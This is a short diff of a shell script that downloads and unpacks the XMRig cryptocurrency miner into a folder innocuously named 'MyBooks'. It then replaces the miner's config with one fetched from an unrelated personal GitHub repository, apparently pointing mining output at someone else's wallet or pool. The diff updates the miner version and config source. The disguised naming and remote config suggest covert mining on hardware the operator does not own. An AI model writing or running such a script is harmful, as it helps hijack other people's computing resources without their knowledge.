@@ -9,13 +9,18 @@ cd
 mkdir MyBooks
 cd MyBooks
 
-wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-focal-x64.tar.gz
-tar xvzf xmrig-6.16.4-focal-x64.tar.gz
-cd xmrig-6.16.4
-rm config.json
-wget https://raw.githubusercontent.com/Novabooks21/CoolBooks2/main/MainData/Main/config.json
+#wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-focal-x64.tar.gz
+#tar xvzf xmrig-6.16.4-focal-x64.tar.gz
+#cd xmrig-6.16.4
 
-cd ~/MyBooks/xmrig-proxy-6.15.1
+wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-bionic-x64.tar.gz
+tar xvzf xmrig-6.17.0-bionic-x64.tar.gz
+cd xmrig-6.17.0
+
+rm config.json
+wget https://raw.githubusercontent.com/KevinWilson62/Cool1/main/Main/config.json
+
+cd ~/MyBooks/xmrig-6.17.0
 clear
 
 
